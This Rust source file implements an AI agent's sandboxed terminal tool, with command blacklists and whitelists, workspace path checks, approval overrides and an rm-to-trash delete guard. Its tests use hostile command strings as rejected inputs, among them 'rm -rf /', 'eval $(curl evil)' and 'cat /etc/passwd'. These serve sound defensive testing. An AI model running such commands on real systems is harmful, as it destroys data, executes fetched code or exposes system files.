use crate::path_guard;
use crate::tools::Tool;
use anyhow::{anyhow, Result};
use async_trait::async_trait;
use serde_json::Value;
use std::path::{Path, PathBuf};
use std::sync::Arc;
#[cfg(windows)]
use tokio::io::AsyncWriteExt;
use tokio::process::Command as TokioCommand;
use tokio::sync::RwLock;

pub struct Terminal {
    pub command_policy: String,
    pub command_whitelist: Vec<String>,
    pub workspace: Arc<RwLock<PathBuf>>,
    /// 会话级受信目录（plan.md #B，与 Agent 共享同一 Arc）：执行层边界 = workspace ∪ 受信
    pub trusted: Arc<RwLock<Vec<PathBuf>>>,
    /// skills 目录（<config_dir>/skills）：terminal 读/执行 skill 目录内脚本、资产时放行。
    /// None 时不对 skills 目录做额外放行（与旧行为一致）。
    skills_dir: Option<PathBuf>,
    /// 删除护栏（rm → .trash，2026-09-17）：开启时 bound path 内破坏性命令转
    /// `.trash/` 可恢复，界外由审批层强制人审。构造自 `[tools.terminal].delete_guard != "off"`。
    delete_guard: bool,
    /// Windows 上探测到的 Git Bash 路径；None 表示未找到，执行回退到 `cmd /C`。
    #[cfg(windows)]
    bash_path: Option<PathBuf>,
}

impl Terminal {
    pub fn new(
        command_policy: String,
        command_whitelist: Vec<String>,
        workspace: Arc<RwLock<PathBuf>>,
        trusted: Arc<RwLock<Vec<PathBuf>>>,
        skills_dir: Option<PathBuf>,
        delete_guard: bool,
    ) -> Self {
        Self {
            command_policy,
            command_whitelist,
            workspace,
            trusted,
            skills_dir,
            delete_guard,
            #[cfg(windows)]
            bash_path: detect_bash(),
        }
    }

    /// 命令策略校验
    fn check_command_policy(&self, command: &str) -> Result<()> {
        match self.command_policy.as_str() {
            "none" => Ok(()),
            "blacklist" => {
                if path_guard::hits_command_blacklist(command) {
                    anyhow::bail!("command matches blocklist: {}", command);
                }
                Ok(())
            }
            "whitelist" => {
                let first = command.split_whitespace().next().unwrap_or("");
                if !self.command_whitelist.iter().any(|w| w == first) {
                    anyhow::bail!("command {} is not in the whitelist", first);
                }
                Ok(())
            }
            _ => Ok(()),
        }
    }

    /// 三层路径防御
    fn check_path_safety(
        &self,
        command: &str,
        workspace: &Path,
        trusted: &[PathBuf],
    ) -> Result<()> {
        // 第一层：shell 包装拒绝
        path_guard::check_shell_wrappers(command)?;

        // 第二层 + 第三层：路径白名单（workspace ∪ 受信目录）+ 黑名单兜底
        // （skills 目录作只读放行）
        path_guard::validate_command_paths_in_scope(
            command,
            workspace,
            trusted,
            self.skills_dir.as_deref(),
        )?;

        Ok(())
    }
}

/// 探测可用的 Git Bash（Windows）。
///
/// 候选顺序：常见 Git for Windows 安装位置 → PATH 中解析到的 bash.exe。
/// 排除 WSL 假 bash（`System32\bash.exe` / `WindowsApps\bash.exe`），
/// 并逐一校验确为 MSYS bash（`$MSYSTEM` 非空），避免选到 WSL/Linux bash。
#[cfg(windows)]
fn detect_bash() -> Option<PathBuf> {
    let mut candidates: Vec<PathBuf> = Vec::new();

    // 常见安装位置（bin/bash.exe 或 usr/bin/bash.exe）
    for base in [
        r"C:\Program Files\Git",
        r"C:\Program Files (x86)\Git",
        r"E:\scoop\apps\git\current",
        r"E:\apps\Git",
        r"C:\Users\THAD\.workbuddy\binaries\PortableGit\versions\1.2.0",
    ] {
        candidates.push(PathBuf::from(base).join("bin").join("bash.exe"));
        candidates.push(PathBuf::from(base).join("usr").join("bin").join("bash.exe"));
    }

    // PATH 中解析 bash.exe（跳过 WSL / WindowsApps 假 bash）
    if let Ok(path) = std::env::var("PATH") {
        for dir in path.split(';') {
            if dir.is_empty() {
                continue;
            }
            let p = PathBuf::from(dir).join("bash.exe");
            if p.exists() {
                let lower = p.to_string_lossy().to_ascii_lowercase();
                if lower.contains("system32") || lower.contains("windowsapps") {
                    continue;
                }
                candidates.push(p);
            }
        }
    }

    candidates.into_iter().find(|c| is_msys_bash(c))
}

/// 校验指定路径的 bash 确为 MSYS bash（输出 `$MSYSTEM`，WSL/纯 Linux bash 为空）。
#[cfg(windows)]
fn is_msys_bash(path: &Path) -> bool {
    std::process::Command::new(path)
        .args(["-c", "printf %s \"$MSYSTEM\""])
        .output()
        .map(|o| o.status.success() && !String::from_utf8_lossy(&o.stdout).trim().is_empty())
        .unwrap_or(false)
}

/// 执行 shell 命令（Windows 分支）。
///
/// - Git Bash 可用：`bash -s` 经 stdin 喂命令，绕开 MSVCRT argv 转义层——
///   双引号 / `;` 链 / `$VAR` / 单引号按 bash 语义正确解析，输出天然 UTF-8。
/// - 无 Git Bash：回退 `cmd /C` + `raw_arg` 原样传参，避免二次转义
///   （引号语义交给 cmd；`;`/`$VAR`/中文在兜底路径下仍受 cmd 限制）。
#[cfg(windows)]
async fn run_command(
    command: &str,
    bash: Option<&Path>,
    workspace: &Path,
) -> std::io::Result<std::process::Output> {
    if let Some(bash) = bash {
        let mut child = TokioCommand::new(bash)
            .args(["-s"])
            .current_dir(workspace)
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()?;
        let mut stdin = child
            .stdin
            .take()
            .ok_or_else(|| std::io::Error::other("no stdin"))?;
        stdin.write_all(command.as_bytes()).await?;
        drop(stdin); // EOF → bash 读完脚本后自行退出
        child.wait_with_output().await
    } else {
        TokioCommand::new("cmd")
            .raw_arg("/C")
            .raw_arg(command)
            .current_dir(workspace)
            .output()
            .await
    }
}

#[async_trait]
impl Tool for Terminal {
    fn name(&self) -> &str {
        "terminal"
    }
    fn description(&self) -> &str {
        "Execute a shell command in the agent workspace. Returns combined stdout+stderr."
    }
    fn parameters_schema(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": { "type": "string", "description": "Shell command to execute (runs in agent workspace)" }
            },
            "required": ["command"]
        })
    }
    fn requires_confirm(&self) -> bool {
        true
    }
    async fn execute(&self, args: &Value, channel: &str) -> Result<String> {
        self.run(args, false, channel).await
    }

    /// 批准豁免（ADR-0020）：`/ok` 后跳过 workspace 白名单（用户已看到完整命令并
    /// 批准），shell 包装/路径白名单不再拦截；命令策略（黑名单档含灾难命令表）与
    /// 危险路径前缀黑名单兜底仍保留。删除护栏不再接管——审批后真删（人已批准）。
    async fn execute_approved(
        &self,
        args: &Value,
        _channel: &str,
        _event_tx: Option<&tokio::sync::mpsc::Sender<crate::agent::TurnEvent>>,
    ) -> Result<String> {
        self.run(args, true, "").await
    }
}

impl Terminal {
    async fn run(&self, args: &Value, approved: bool, channel: &str) -> Result<String> {
        let command = args
            .get("command")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("missing 'command'"))?;

        let workspace = self.workspace.read().await.clone();

        // 命令策略校验（含用户配置的黑名单档）
        self.check_command_policy(command)?;

        if !approved {
            // 三层路径防御
            let trusted = self.trusted.read().await.clone();
            self.check_path_safety(command, &workspace, &trusted)?;
        } else {
            // 批准豁免仍保留危险路径黑名单兜底（catastrophic 前缀不因人审放行）
            for token in path_guard::extract_path_tokens(command) {
                if path_guard::hits_blacklist(&token) {
                    anyhow::bail!("path {:?} matches dangerous blacklist prefix", token);
                }
            }
        }

        // 删除护栏（rm → .trash，2026-09-17）：bound path 内破坏性命令先转回收站，
        // 再照常执行原命令——非破坏段不受影响，rm 段对已移走文件自然 no-op
        // （-f 静默 / 无 -f 报 No such file，诚实可见）。失败不降级真删：
        // rename 出错直接整条报错（已移动部分留档 manifest）。
        let mut guard_notice = String::new();
        if !approved && self.delete_guard {
            guard_notice = self
                .trash_destructive(command, &workspace, channel)
                .await?
                .unwrap_or_default();
        }

        #[cfg(windows)]
        let output = run_command(command, self.bash_path.as_deref(), &workspace).await;
        #[cfg(not(windows))]
        let output = TokioCommand::new("sh")
            .args(["-c", command])
            .current_dir(&workspace)
            .output()
            .await;

        let output = output.map_err(|e| anyhow!("spawn: {}", e))?;
        let mut combined = String::new();
        if !output.stdout.is_empty() {
            combined.push_str(&String::from_utf8_lossy(&output.stdout));
        }
        if !output.stderr.is_empty() {
            combined.push_str(&String::from_utf8_lossy(&output.stderr));
        }
        if !output.status.success() {
            combined.push_str(&format!(
                "\n[exit code: {}]",
                output.status.code().unwrap_or(-1)
            ));
        }
        if !guard_notice.is_empty() {
            combined = format!("{}\n{}", guard_notice, combined);
        }
        Ok(combined)
    }

    /// 删除护栏执行体：命令含破坏性段且目标全在 bound path 内时，把目标移入
    /// `<workspace>/.trash/<ts>/` 并返回告知文案；否则返回 None（照常跑 shell）。
    async fn trash_destructive(
        &self,
        command: &str,
        workspace: &Path,
        channel: &str,
    ) -> Result<Option<String>> {
        let targets = match path_guard::destructive_targets(command) {
            Some(t) if !t.is_empty() => t,
            _ => return Ok(None), // 无破坏段 / 无目标：shell 自行处理
        };
        if !path_guard::destructive_all_within_bound(&targets, workspace) {
            // 界外（含受信目录）：审批层已强制人审，/ok 后走真删
            return Ok(None);
        }

        // rm 的 -f 语义：目标不存在时静默跳过（组合 flag -rf 同样命中）
        let force = tokenize_tokens(command).iter().any(|t| {
            (t.starts_with('-') && !t.starts_with("--") && t.contains('f')) || t == "--force"
        });

        let ts = chrono::Utc::now().format("%Y%m%dT%H%M%S%3f").to_string();
        let trash_dir = workspace.join(".trash").join(&ts);
        let mut moved: Vec<String> = Vec::new();
        let mut originals: Vec<String> = Vec::new();
        for raw in &targets {
            let expanded = expand_target(workspace, raw, force)?;
            for target in expanded {
                if target == workspace {
                    anyhow::bail!("[delete-guard] refusing to move the workspace root itself");
                }
                let rel = target
                    .strip_prefix(workspace)
                    .map(|p| p.to_path_buf())
                    .unwrap_or_else(|_| target.clone());
                if rel.starts_with(".trash") {
                    anyhow::bail!(
                        "[delete-guard] refusing to trash .trash contents (restore via mv instead): {}",
                        rel.display()
                    );
                }
                // rm 的 -f 语义：字面目标不存在时静默跳过（无 -f 则报错，与 shell 一致）
                if !target.exists() {
                    if force {
                        continue;
                    }
                    anyhow::bail!("[delete-guard] no such file: {}", target.display());
                }
                let dest = trash_dir.join(&rel);
                if let Some(parent) = dest.parent() {
                    tokio::fs::create_dir_all(parent).await.map_err(|e| {
                        anyhow!("[delete-guard] create_dir_all {}: {}", dest.display(), e)
                    })?;
                }
                tokio::fs::rename(&target, &dest).await.map_err(|e| {
                    anyhow!(
                        "[delete-guard] failed to move {} into trash: {} (already-moved paths remain in .trash, see manifest)",
                        target.display(),
                        e
                    )
                })?;
                moved.push(rel.to_string_lossy().replace('\\', "/"));
                originals.push(target.to_string_lossy().replace('\\', "/"));
            }
        }
        if moved.is_empty() {
            return Ok(None); // 全部目标不存在且带 -f：与 shell 行为一致，无事发生
        }

        // manifest 追加一行，供恢复/审计（原路径绝对形态）
        tokio::fs::create_dir_all(&trash_dir).await?;
        let entry = serde_json::json!({
            "ts": ts,
            "channel": channel,
            "trash_dir": format!(".trash/{}", ts),
            "targets": originals,
        });
        use tokio::io::AsyncWriteExt;
        let mut manifest = tokio::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(workspace.join(".trash").join("manifest.jsonl"))
            .await?;
        manifest
            .write_all(format!("{}\n", entry).as_bytes())
            .await?;
        manifest.flush().await?;

        let mut notice = format!(
            "[delete-guard] moved {} path(s) to .trash/{}/ instead of deleting (restorable; manifest: .trash/manifest.jsonl):",
            moved.len(),
            ts
        );
        for m in &moved {
            notice.push_str(&format!("\n- {}", m));
        }
        Ok(Some(notice))
    }
}

/// 解析单个删除目标：经 `validate_path` 归一（MSYS 换算 / `~` / 词法规范化），
/// glob 字符（`*?[`）时展开为实际存在的路径集合。展开为空：带 -f 静默、否则报错
/// （与 shell `rm` 行为一致）。
fn expand_target(workspace: &Path, raw: &str, force: bool) -> Result<Vec<std::path::PathBuf>> {
    let base = path_guard::validate_path(workspace, raw, None)?;
    if !raw.contains('*') && !raw.contains('?') && !raw.contains('[') {
        return Ok(vec![base]);
    }
    let hits = expand_glob(&base);
    if hits.is_empty() {
        if force {
            return Ok(vec![]);
        }
        anyhow::bail!("[delete-guard] glob matched nothing: {}", raw);
    }
    Ok(hits)
}

/// 对归一化后的路径做 glob 展开：从最长已存在目录前缀起，逐组件匹配 `*`/`?`。
/// 无新依赖（项目惯例避免新增 crate），匹配器只支持单组件内通配。
fn expand_glob(base: &Path) -> Vec<std::path::PathBuf> {
    let comps: Vec<std::ffi::OsString> = base
        .components()
        .map(|c| c.as_os_str().to_os_string())
        .collect();
    // 找最长已存在的目录前缀（从根开始逐级下探）
    let mut anchor = std::path::PathBuf::new();
    let mut idx = 0;
    for (i, c) in comps.iter().enumerate() {
        let next = if anchor.as_os_str().is_empty() {
            std::path::PathBuf::from(c)
        } else {
            anchor.join(c)
        };
        if next.is_dir() {
            anchor = next;
            idx = i + 1;
        } else {
            break;
        }
    }
    let mut out = Vec::new();
    glob_walk(&anchor, &comps[idx..], &mut out);
    out.sort();
    out
}

fn glob_walk(dir: &Path, comps: &[std::ffi::OsString], out: &mut Vec<std::path::PathBuf>) {
    if comps.is_empty() {
        out.push(dir.to_path_buf());
        return;
    }
    let comp = comps[0].to_string_lossy().to_string();
    let has_glob = comp.contains('*') || comp.contains('?');
    if !has_glob {
        let next = dir.join(&comps[0]);
        if comps.len() == 1 {
            if next.exists() {
                out.push(next);
            }
        } else if next.is_dir() {
            glob_walk(&next, &comps[1..], out);
        }
        return;
    }
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };
    for entry in entries.flatten() {
        let name = entry.file_name().to_string_lossy().to_string();
        if glob_match(&comp, &name) {
            let next = dir.join(entry.file_name());
            if comps.len() == 1 {
                out.push(next);
            } else if next.is_dir() {
                glob_walk(&next, &comps[1..], out);
            }
        }
    }
}

/// 单组件通配匹配：`*` 任意串、`?` 单字符（经典双指针回溯）
fn glob_match(pattern: &str, name: &str) -> bool {
    let p: Vec<char> = pattern.chars().collect();
    let n: Vec<char> = name.chars().collect();
    let (mut pi, mut ni) = (0usize, 0usize);
    let (mut star, mut backtrack) = (usize::MAX, 0usize);
    while ni < n.len() {
        if pi < p.len() && (p[pi] == '?' || p[pi] == n[ni]) {
            pi += 1;
            ni += 1;
        } else if pi < p.len() && p[pi] == '*' {
            star = pi;
            backtrack = ni;
            pi += 1;
        } else if star != usize::MAX {
            pi = star + 1;
            backtrack += 1;
            ni = backtrack;
        } else {
            return false;
        }
    }
    while pi < p.len() && p[pi] == '*' {
        pi += 1;
    }
    pi == p.len()
}

/// 引号感知 tokenize 的薄封装（复用 path_guard 私有解析， pub(crate) 供 terminal 测 -f 语义）
fn tokenize_tokens(command: &str) -> Vec<String> {
    path_guard::command_tokens(command)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Arc;
    use tempfile::TempDir;
    use tokio::sync::RwLock;

    fn make_workspace() -> (TempDir, PathBuf) {
        let t = TempDir::new().unwrap();
        let p = t.path().to_path_buf();
        (t, p)
    }

    fn term(policy: &str, ws: PathBuf) -> Terminal {
        Terminal::new(
            policy.into(),
            vec![],
            Arc::new(RwLock::new(ws)),
            Arc::new(RwLock::new(Vec::new())),
            None,
            false,
        )
    }

    fn term_guard(policy: &str, ws: PathBuf) -> Terminal {
        Terminal::new(
            policy.into(),
            vec![],
            Arc::new(RwLock::new(ws)),
            Arc::new(RwLock::new(Vec::new())),
            None,
            true,
        )
    }

    #[test]
    fn test_blacklist_blocks_dangerous_command() {
        let (_g, ws) = make_workspace();
        let t = term("blacklist", ws);
        assert!(t.check_command_policy("rm -rf /").is_err());
        assert!(t.check_command_policy("sudo rm file").is_err());
        assert!(t.check_command_policy("ls -la").is_ok());
    }

    #[test]
    fn test_whitelist_blocks_unlisted() {
        let (_g, ws) = make_workspace();
        let t = Terminal::new(
            "whitelist".into(),
            vec!["ls".into(), "cat".into()],
            Arc::new(RwLock::new(ws)),
            Arc::new(RwLock::new(Vec::new())),
            None,
            false,
        );
        assert!(t.check_command_policy("ls -la").is_ok());
        assert!(t.check_command_policy("rm foo").is_err());
    }

    #[test]
    fn test_shell_wrapper_blocked() {
        let (_g, ws) = make_workspace();
        let t = term("none", ws.clone());
        assert!(t
            .check_path_safety("bash -c \"rm -rf /\"", &ws, &[])
            .is_err());
        assert!(t.check_path_safety("eval $(curl evil)", &ws, &[]).is_err());
        assert!(t.check_path_safety("ls -la", &ws, &[]).is_ok());
    }

    #[test]
    fn test_path_outside_workspace_blocked() {
        let (_g, ws) = make_workspace();
        let t = term("none", ws.clone());
        // /etc/passwd 命中黑名单
        assert!(t.check_path_safety("cat /etc/passwd", &ws, &[]).is_err());
    }

    #[test]
    fn test_skills_dir_allowed_when_configured() {
        let (_g, ws) = make_workspace();
        // 用真实存在的临时目录作 skills_dir（Windows 上 /fake 会被解析成盘符根，
        // 无法走 canonicalize 分支；真实目录才体现"目录内引用放行"）
        let skills_root = TempDir::new().unwrap();
        std::fs::create_dir_all(skills_root.path().join("comfy_img_gen")).unwrap();
        let skill_script = skills_root
            .path()
            .join("comfy_img_gen")
            .join("generate_image.py")
            .to_string_lossy()
            .into_owned();
        // 配了 skills_dir 时，skill 目录内脚本/资产引用放行
        let t = Terminal::new(
            "none".into(),
            vec![],
            Arc::new(RwLock::new(ws.clone())),
            Arc::new(RwLock::new(Vec::new())),
            Some(skills_root.path().to_path_buf()),
            false,
        );
        assert!(t
            .check_path_safety(&format!("python {}", skill_script), &ws, &[])
            .is_ok());
        // 未配 skills_dir 时同一引用仍越界拒绝（保持旧行为）
        let t_no_skills = term("none", ws.clone());
        assert!(t_no_skills
            .check_path_safety(&format!("python {}", skill_script), &ws, &[])
            .is_err());
    }

    #[tokio::test]
    async fn test_execute_echo() {
        let (_g, ws) = make_workspace();
        let t = term("none", ws);
        let result = t
            .execute(&serde_json::json!({"command": "echo hello"}), "cli")
            .await
            .unwrap();
        assert!(result.contains("hello"));
    }

    #[tokio::test]
    async fn test_blacklist_command_rejected() {
        let (_g, ws) = make_workspace();
        let t = term("blacklist", ws);
        let result = t
            .execute(&serde_json::json!({"command": "rm -rf /"}), "cli")
            .await;
        assert!(result.is_err());
    }

    /// 回归（ADR-0020 审批豁免）：用户 `/ok` 批准的 workspace 外命令必须在执行层
    /// 放行——此前 resolve_approval 批准后 execute 仍重跑完整白名单校验，越界操作
    /// 被二次拒绝（game-portfolio 事故：批准了却报 "is outside workspace"）。
    #[tokio::test]
    async fn test_approved_out_of_workspace_command_executes() {
        let ws = TempDir::new().unwrap();
        let outside = TempDir::new().unwrap();
        let secret = outside.path().join("secret.txt");
        std::fs::write(&secret, "approved-content").unwrap();
        // 正斜杠路径：Git Bash / sh 都能吃（Windows 反斜杠会被 bash 当转义符）
        let path_arg = secret.to_string_lossy().replace('\\', "/");
        let cmd = format!("cat {path_arg}");
        let t = term("blacklist", ws.path().to_path_buf());

        // 未批准：越界拒绝
        let err = t
            .execute(&serde_json::json!({ "command": cmd }), "cli")
            .await
            .unwrap_err()
            .to_string();
        assert!(err.contains("outside workspace"), "{err}");

        // 批准豁免：放行并真实执行
        let out = t
            .execute_approved(&serde_json::json!({ "command": cmd }), "cli", None)
            .await
            .expect("approved out-of-workspace command should run");
        assert!(out.contains("approved-content"), "{out}");
    }

    /// 批准豁免不放松灾难前缀黑名单：`C:\Windows` 等前缀即使人审放行也拒绝。
    #[cfg(windows)]
    #[tokio::test]
    async fn test_approved_still_blocks_dangerous_prefix() {
        let (_g, ws) = make_workspace();
        let t = term("none", ws);
        let result = t
            .execute_approved(
                &serde_json::json!({"command": r"cat C:\Windows\win.ini"}),
                "cli",
                None,
            )
            .await;
        assert!(result.is_err(), "approved mode must keep blacklist prefix");
    }

    /// 回归：双引号命令不得被 MSVCRT 转义破坏成 `\"...\"` 字面量。
    #[cfg(windows)]
    #[tokio::test]
    async fn test_execute_double_quotes_not_mangled() {
        let (_g, ws) = make_workspace();
        let t = term("none", ws);
        let result = t
            .execute(
                &serde_json::json!({"command": "echo \"hello world\""}),
                "cli",
            )
            .await
            .unwrap();
        assert!(result.contains("hello world"), "got: {}", result);
        assert!(
            !result.contains("\\\""),
            "double quotes mangled to literal backslash-quote: {}",
            result
        );
    }

    /// 回归：bash 路径下中文输出必须按 UTF-8 解码（无 Git Bash 时 cmd 兜底不保证，跳过）。
    #[cfg(windows)]
    #[tokio::test]
    async fn test_execute_unicode_in_bash() {
        let (_g, ws) = make_workspace();
        let t = term("none", ws);
        if t.bash_path.is_none() {
            return;
        }
        let result = t
            .execute(&serde_json::json!({"command": "echo 中文测试"}), "cli")
            .await
            .unwrap();
        assert!(result.contains("中文测试"), "got: {}", result);
    }

    // ---------------- Delete Guard：rm → .trash ----------------

    #[tokio::test]
    async fn test_delete_guard_trashes_workspace_file() {
        let (_g, ws) = make_workspace();
        std::fs::write(ws.join("victim.txt"), b"x").unwrap();
        let t = term_guard("none", ws.clone());

        let out = t
            .execute(&serde_json::json!({"command": "rm victim.txt"}), "test")
            .await
            .unwrap();
        assert!(out.contains("[delete-guard]"), "got: {}", out);
        assert!(!ws.join("victim.txt").exists(), "原文件应已移走");

        // 落进 .trash/<ts>/，manifest 留档原路径
        let trash = ws.join(".trash");
        let ts_dir = std::fs::read_dir(&trash)
            .unwrap()
            .find(|e| e.as_ref().unwrap().file_name().to_string_lossy() != "manifest.jsonl")
            .unwrap()
            .unwrap();
        assert!(ts_dir.path().join("victim.txt").exists());
        let manifest = std::fs::read_to_string(trash.join("manifest.jsonl")).unwrap();
        assert!(manifest.contains("victim.txt"), "manifest: {}", manifest);
        assert!(
            manifest.contains("\"channel\":\"test\""),
            "manifest: {}",
            manifest
        );
    }

    #[tokio::test]
    async fn test_delete_guard_composite_command_keeps_other_segments() {
        let (_g, ws) = make_workspace();
        std::fs::write(ws.join("gone.txt"), b"x").unwrap();
        let t = term_guard("none", ws.clone());

        let out = t
            .execute(
                &serde_json::json!({"command": "echo alive && rm gone.txt"}),
                "test",
            )
            .await
            .unwrap();
        assert!(out.contains("alive"), "非破坏段应照常执行: {}", out);
        assert!(out.contains("[delete-guard]"), "got: {}", out);
        assert!(!ws.join("gone.txt").exists());
    }

    #[tokio::test]
    async fn test_delete_guard_glob_expansion() {
        let (_g, ws) = make_workspace();
        std::fs::write(ws.join("a.log"), b"1").unwrap();
        std::fs::write(ws.join("b.log"), b"2").unwrap();
        std::fs::write(ws.join("keep.txt"), b"3").unwrap();
        let t = term_guard("none", ws.clone());

        let out = t
            .execute(&serde_json::json!({"command": "rm *.log"}), "test")
            .await
            .unwrap();
        assert!(out.contains("[delete-guard]"), "got: {}", out);
        assert!(!ws.join("a.log").exists());
        assert!(!ws.join("b.log").exists());
        assert!(ws.join("keep.txt").exists(), "非匹配文件不应受影响");
    }

    #[tokio::test]
    async fn test_delete_guard_missing_target_with_force_is_noop() {
        let (_g, ws) = make_workspace();
        let t = term_guard("none", ws.clone());

        // rm -f 不存在的目标：与 shell 语义一致，静默无事发生
        let out = t
            .execute(
                &serde_json::json!({"command": "rm -f maybe-missing.log"}),
                "test",
            )
            .await
            .unwrap();
        assert!(!out.contains("[delete-guard]"), "got: {}", out);
        assert!(!ws.join(".trash").exists(), "不应产生 trash 目录");
    }

    #[tokio::test]
    async fn test_delete_guard_missing_target_without_force_errors() {
        let (_g, ws) = make_workspace();
        let t = term_guard("none", ws.clone());

        // 无 -f 时与 shell 一致报错，且不降级真删
        let result = t
            .execute(
                &serde_json::json!({"command": "rm maybe-missing.log"}),
                "test",
            )
            .await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_delete_guard_refuses_trash_self_and_workspace_root() {
        let (_g, ws) = make_workspace();
        std::fs::create_dir_all(ws.join(".trash").join("t0")).unwrap();
        let t = term_guard("none", ws.clone());

        // rm -rf .trash：拒绝（恢复通道本身不得被删）
        let result = t
            .execute(&serde_json::json!({"command": "rm -rf .trash"}), "test")
            .await;
        assert!(result.is_err());
        assert!(ws.join(".trash").join("t0").exists(), ".trash 不应被动");

        // rm . ：拒绝移动 workspace 根自身
        let result = t
            .execute(&serde_json::json!({"command": "rm -rf ."}), "test")
            .await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_delete_guard_outside_bound_not_intercepted_here() {
        let (_g, ws) = make_workspace();
        let t = term_guard("none", ws.clone());

        // 界外目标：护栏放行（审批层强制人审），执行层 path 校验直接拒绝
        let result = t
            .execute(
                &serde_json::json!({"command": "rm -f /tmp/llaia-guard-test"}),
                "test",
            )
            .await;
        assert!(result.is_err(), "界外路径应被三层路径防御拦截");
    }

    #[tokio::test]
    async fn test_delete_guard_off_keeps_old_behavior() {
        let (_g, ws) = make_workspace();
        std::fs::write(ws.join("plain.txt"), b"x").unwrap();
        let t = term("none", ws.clone()); // delete_guard = false

        let out = t
            .execute(&serde_json::json!({"command": "rm plain.txt"}), "test")
            .await
            .unwrap();
        assert!(!out.contains("[delete-guard]"), "got: {}", out);
        assert!(!ws.join("plain.txt").exists(), "旧行为：真删");
        assert!(!ws.join(".trash").exists());
    }

    #[test]
    fn test_glob_match_basic() {
        assert!(glob_match("*", "anything.log"));
        assert!(glob_match("*.log", "a.log"));
        assert!(!glob_match("*.log", "a.txt"));
        assert!(glob_match("a?c", "abc"));
        assert!(!glob_match("a?c", "ac"));
        assert!(glob_match("a*c", "abbbc"));
    }
}
